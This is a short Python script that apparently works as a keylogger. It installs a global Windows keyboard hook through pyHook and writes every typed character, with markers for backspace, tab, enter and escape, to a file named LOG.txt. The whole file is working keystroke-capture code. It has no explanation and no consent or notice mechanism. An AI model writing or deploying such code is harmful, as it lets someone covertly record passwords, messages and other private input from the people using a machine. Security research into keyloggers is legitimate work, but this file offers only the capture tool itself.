"""Logger"""
import pythoncom
import pyHook

LOG = ""
LOG_PATH = "LOG.txt"

OPEN_FILE = open(LOG_PATH, "w")
OPEN_FILE.write("")


def on_keyboard_event(event):
    """On OnKeyboardEvent"""
    global LOG
    if event.Ascii == 8:
        LOG = "[BS]" + "\n"
    elif event.Ascii == 9:
        LOG = "[TAB]" + "\n"
    elif event.Ascii == 13:
        LOG = "[NL]" + "\n"
    elif event.Ascii == 27:
        LOG = "[ESC]" + "\n"
    elif event.Ascii == 15:
        OPEN_FILE.close()
        exit()
    else:
        LOG = chr(event.Ascii)
    OPEN_FILE.write(LOG)


HM = pyHook.HookManager()
HM.KeyDown = on_keyboard_event
HM.HookKeyboard()
pythoncom.PumpMessages()
